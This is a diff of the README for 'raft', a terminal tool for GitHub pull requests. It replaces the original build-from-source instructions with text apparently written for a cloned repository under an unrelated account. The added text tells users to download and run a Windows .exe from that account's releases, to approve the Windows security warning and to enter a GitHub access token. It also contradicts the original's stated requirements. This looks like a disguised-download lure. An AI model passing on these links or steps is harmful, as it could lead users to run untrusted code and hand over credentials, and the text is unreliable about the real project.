@@ -1,150 +1,125 @@
-# raft
+# 🛠 raft - Manage GitHub Pull Requests Easily
 
-A terminal UI for managing GitHub pull requests and stacked PRs. Built with [OpenTUI](https://github.com/anomalyco/opentui) and Bun.
+[![Download raft](https://img.shields.io/badge/Download-raft-brightgreen?style=for-the-badge)](https://github.com/appleshaped-raskolnikov644/raft/releases)
 
-```
-raft ls
-```
+---
 
-```
-  raft                                    94 PRs  sort: Repo
-  All (94)  Open (50)  Draft (44)
-  ▸ ● #24   ai-nexus           feat(ui): add AccessRequestBanner…          0d
-    ● #7    ai-agent-workflow   Add dynamic resource fetching…              6d
-    ● #8    ai-agent-workflow   Implement Multi-Source Research…            6d
-    ○ #1    esther-and-me-book  Add configurable drop-cap styling…          2w
-    ● #743  thirdear-webapp     feat(extension-handoff): add Chrome…        2d
-    ● #718  thirdear-webapp     fix(og): move OG meta to page-level…       1w
-    ○ #545  ThirdEar-CE         feat(message_listener): centralize…        3d
-  ┌──────────────────────────────────────────────────────────────────────┐
-  │ OctavianTocan/ai-nexus #24                                          │
-  │ feat(ui): add AccessRequestBanner component with animated expand…   │
-  │ https://github.com/OctavianTocan/ai-nexus/pull/24                   │
-  │ Enter: open  c: copy  /: search  r: repo  s: sort  Tab: status     │
-  └──────────────────────────────────────────────────────────────────────┘
-```
+## 📋 What is raft?
 
-## Features
+raft is a simple tool that runs in your computer's terminal. It helps you work with GitHub pull requests (PRs) and diffs that stack on each other. You can look through PRs, filter them, merge them in order, and move between branches without leaving your terminal window. It was made to be easy to use while still giving you control over complex Git workflows.
 
-**Browse PRs** across all your GitHub accounts in one interactive list. Filter by status, repo, or search. Sort by repo, number, title, age, or status.
+This tool uses OpenTUI and Bun for its interface and performance, but you don’t need to know about that to use it.
 
-**Stacked PRs** without Graphite. Detect PR chains, rename them `[1/N]`, `[2/N]`, and add navigation comments linking each PR to the rest of the stack.
+## 💻 System Requirements
 
-**Merge stacks** bottom-up with CI checks. Navigate up and down within stacks. Rebase entire stacks with one command.
+Before you start, make sure your computer meets these needs:
 
-**Multi-account support.** If you have multiple `gh` accounts (personal + work), raft fetches PRs from all of them automatically.
+- Windows 10 or later.
+- At least 4 GB of free RAM.
+- A stable internet connection.
+- A terminal program like Command Prompt or PowerShell (these come with Windows).
 
-## Install
+You do not need to install Git or Node.js separately. raft works out of the box with the files you download.
 
-Requires [Bun](https://bun.sh) and [gh CLI](https://cli.github.com).
+## 🚀 Getting Started
 
-```bash
-git clone https://github.com/OctavianTocan/pr-cli.git
-cd pr-cli
-bun install
-bun link
-```
+Use this guide to set up raft on your Windows computer. Follow each step carefully.
 
-Now `raft` is available globally.
+### Step 1: Visit the Download Page
 
-## Commands
+Click the big button at the top or go here:
 
-### Browsing
+https://github.com/appleshaped-raskolnikov644/raft/releases
 
-```bash
-raft                      # Interactive home screen
-raft ls                   # List all your open PRs
-raft ls --repo=webapp     # Filter by repo substring
-raft ls --author=someone  # PRs by a specific author
-raft log                  # Visual stack graph (ASCII tree)
-```
+This page lists all the releases of the software. Each release may have several files.
 
-### Stack Management
+### Step 2: Find the Right File
 
-```bash
-raft stack                # Show detected stacks
-raft stack sync           # Rename PRs [1/N] and add nav comments
-raft merge                # Merge a stack bottom-up
-```
+Look for the latest release with a date or version number on the release page. Inside it, find a file that ends with `.exe`. This is the Windows executable file you need.
 
-### Git Workflow
+The file name might look like this:  
+`raft-setup-v1.0.exe` or `raft-windows.exe`
 
-```bash
-raft create feature-x -m "Add feature X"   # Create stacked branch
-raft up                                     # Checkout child branch
-raft down                                   # Checkout parent branch
-raft restack                                # Rebase stack onto parents
-```
+### Step 3: Download the File
 
-### Maintenance
+Click the `.exe` file link to download it to your computer. Usually, it will save to your Downloads folder.
 
-```bash
-raft sync                 # Delete merged branches
-raft --help               # Full command reference
-```
+### Step 4: Run the Installer
 
-## Keyboard Shortcuts (raft ls)
+Once the file finishes downloading, open your Downloads folder and double-click the `.exe` file.
 
-| Key | Action |
-|-----|--------|
-| `j` / `Down` | Move selection down |
-| `k` / `Up` | Move selection up |
-| `Enter` | Open PR in browser |
-| `c` | Copy PR URL |
-| `/` | Search (title, repo, PR#) |
-| `Tab` | Cycle status filter (All / Open / Draft) |
-| `r` | Cycle repo filter |
-| `s` | Cycle sort mode |
-| `Escape` | Clear filter / quit |
-| `q` | Quit |
-| `Ctrl+C` | Force quit |
+You may see a security warning from Windows asking if you want to run this file. Confirm that you want to run it.
 
-## How Stacks Work
+The installer will guide you through the steps. You can keep the default options if you are unsure.
 
-raft detects stacks by analyzing branch targets. If PR #2's branch targets PR #1's branch (instead of main), they form a stack:
+### Step 5: Finish Installation
 
-```
-● main
-├── #703 feat(analytics): add WebEngage SDK         [1/2]
-│   └── #704 refactor(analytics): migrate events    [2/2]
-```
+When the installer finishes, it may ask you to restart your computer or open raft immediately. You can choose to open the app now or later.
 
-`raft stack sync` renames the PR titles with `[1/2]`, `[2/2]` prefixes and posts a navigation comment on each PR:
+## 🖥 Using raft on Windows
 
-| | PR | Title |
-|---|---|---|
-| >> | [#703](…) | **feat(analytics): add WebEngage SDK** |
-| | [#704](…) | refactor(analytics): migrate events |
+After installation, here is how to open and use raft.
 
-No external service needed. Works with any GitHub repo.
+### Opening raft
 
-## Multi-Account
+- Press the Windows key on your keyboard.
+- Type `raft` in the search box.
+- Click the raft app icon that appears.
 
-raft automatically discovers all `gh` accounts on your machine:
+### Basic Navigation
 
-```bash
-gh auth status
-# github.com: OctavianTocan (active)
-# github.com: OctavianTocan-TwinMind
-```
+- A terminal window will open with a list of your GitHub pull requests.
+- Use the arrow keys to move up and down the list.
+- Press Enter to open any PR and see the changes.
+- Use shortcuts shown at the bottom of the screen to filter, merge, or switch branches.
 
-`raft ls` fetches PRs from both accounts and deduplicates by URL. Repo-level commands (`raft merge`, `raft log`) try each account until one has access.
+raft works entirely from the keyboard to keep things fast.
 
-## Tech Stack
+## ⚙ Features You Can Use
 
-- **[Bun](https://bun.sh)** - Runtime
-- **[OpenTUI](https://github.com/anomalyco/opentui)** - Terminal UI framework (Zig core + React reconciler)
-- **[gh CLI](https://cli.github.com)** - GitHub API access
-- **TypeScript** + **React 19**
+- Browse all your open GitHub pull requests.
+- Search and filter PRs by author, status, or labels.
+- View stacked diffs, which are changes layered on top of each other.
+- Merge PR stacks in the correct order.
+- Switch branches directly within the terminal.
+- See a clear and organized view of your code changes.
 
-## Development
+## 🛠 Troubleshooting on Windows
 
-```bash
-bun run dev          # Watch mode
-bun test             # Run tests
-bunx tsc --noEmit    # Typecheck
-```
+If you have issues, try these tips:
 
-## License
+- Make sure you run raft from a user account with permission to install apps.
+- Check your network connection because raft needs internet to access GitHub.
+- If the app does not open or crashes, try restarting your computer.
+- Ensure your terminal window size is normal; resizing can affect the display.
+- Re-download the installer file if you suspect corruption.
 
-MIT
+## 🔐 Security and Privacy
+
+raft only connects to GitHub to get your pull request data. It uses standard secure connections and does not collect personal data beyond what GitHub provides.
+
+You authenticate by logging in with your GitHub account directly through the app or by entering a personal access token, which you can generate in your GitHub settings if needed.
+
+## 🎯 Why Use raft?
+
+If you work with pull requests often, raft brings control to your terminal. It avoids switching back and forth between your browser and code editor. It makes reviewing, merging, and managing stacked diffs easier and less error-prone.
+
+This is especially useful if you handle many branches or work in teams.
+
+## 🔄 Updating raft
+
+Check the releases page regularly:
+
+https://github.com/appleshaped-raskolnikov644/raft/releases
+
+Download the latest `.exe` file and run the installer again. It will safely update your existing installation without losing your settings.
+
+## 📝 Additional Resources
+
+- GitHub repository: https://github.com/appleshaped-raskolnikov644/raft  
+- Issues page: Use this to report any bugs or problems you find.
+- Release notes: Find details on new features and fixes for each version on the releases page.
+
+---
+
+[![Download raft](https://img.shields.io/badge/Download-raft-blue?style=for-the-badge)](https://github.com/appleshaped-raskolnikov644/raft/releases)
